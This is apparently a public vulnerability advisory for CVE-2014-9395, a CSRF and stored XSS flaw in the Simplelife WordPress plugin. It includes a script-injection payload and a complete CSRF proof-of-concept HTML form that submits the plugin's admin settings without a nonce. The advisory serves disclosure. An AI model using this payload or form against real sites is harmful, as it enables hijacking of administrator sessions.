**************************************************************************************
# Title: CSRF / Stored XSS Vulnerability in Simplelife Wordpress Plugin 
# Author: Manideep K	
# CVE-ID: CVE-2014-9395
# Plugin Homepage: https://wordpress.org/plugins/simplelife/
# Version Affected:  1.2 (probably lower versions)
# Severity: High 

# Description: 
Vulnerable Parameter: multiple fields such as simplehoverback, simplehovertext , flickrback etc
Vulnerability Class: 
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29	        
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) 

# About Vulnerability:  This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin’s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 

# Steps to Reproduce: (POC):
After installing the plugin
1. Goto settings -> SimpleLife
2. Insert this payload “ "><script>alert(32)</script> “ into background/text/ border fields anywhere
Update options and see XSS in action
3. Visit settings page of this plugin anytime later and you can see the script executing as it is stored. 

Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below


<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost/wordpress/wp-admin/options-general.php?page=simplelife.php" method="POST">
      <input type="hidden" name="simple&#95;flimit" value="csrf baby&#32;" />
      <input type="hidden" name="simple&#95;cache" value="0" />
      <input type="hidden" name="simple&#95;time" value="H&#58;i" />
      <input type="hidden" name="simple&#95;date" value="M&#32;jS" />
      <input type="hidden" name="simple&#95;tz" value="" />
      <input type="hidden" name="simplehoverback" value="hi" />
      <input type="hidden" name="simplehovertext" value="hi" />
      <input type="hidden" name="simple&#95;hoverborder" value="hi" />
      <input type="hidden" name="s&#95;flickr" value="" />
      <input type="hidden" name="flickrback" value="csrf baby" />
      <input type="hidden" name="flickrtext" value="" />
      <input type="hidden" name="s&#95;delicious" value="" />
      <input type="hidden" name="delback" value="" />
      <input type="hidden" name="deltext" value="" />
      <input type="hidden" name="s&#95;blog" value="&#32;" />
      <input type="hidden" name="blogback" value="" />
      <input type="hidden" name="blogtext" value="" />
      <input type="hidden" name="blogico" value="blog&#46;gif" />
      <input type="hidden" name="s&#95;twitter" value="&#32;" />
      <input type="hidden" name="twitback" value="" />
      <input type="hidden" name="twittext" value="" />
      <input type="hidden" name="s&#95;lastfm" value="" />
      <input type="hidden" name="lastback" value="" />
      <input type="hidden" name="lasttext" value="" />
      <input type="hidden" name="s&#95;facebook" value="" />
      <input type="hidden" name="faceback" value="" />
      <input type="hidden" name="facetext" value="" />
      <input type="hidden" name="simple&#95;feed1" value="" />
      <input type="hidden" name="simple&#95;back1" value="" />
      <input type="hidden" name="simple&#95;text1" value="" />
      <input type="hidden" name="simple&#95;ico1" value="" />
      <input type="hidden" name="simple&#95;feed2" value="" />
      <input type="hidden" name="simple&#95;back2" value="" />
      <input type="hidden" name="simple&#95;text2" value="" />
      <input type="hidden" name="simple&#95;ico2" value="" />
      <input type="hidden" name="simple&#95;feed3" value="" />
      <input type="hidden" name="simple&#95;back3" value="" />
      <input type="hidden" name="simple&#95;text3" value="" />
      <input type="hidden" name="simple&#95;ico3" value="" />
      <input type="hidden" name="simple&#95;feed4" value="" />
      <input type="hidden" name="simple&#95;back4" value="" />
      <input type="hidden" name="simple&#95;text4" value="" />
      <input type="hidden" name="simple&#95;ico4" value="" />
      <input type="hidden" name="info&#95;update" value="Update&#32;Options&#32;Â&#187;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

# Mitigation: 
Plugin Closed

# Disclosure:
2014-11-06:  Author notification
2014-11-20:  WP Team action taken by closing the plugin as there is no response from author
2014-12-09: Public Disclosure

# Credits:
Manideep K
Information Security Researcher
https://in.linkedin.com/in/manideepk
***************************************************************************************
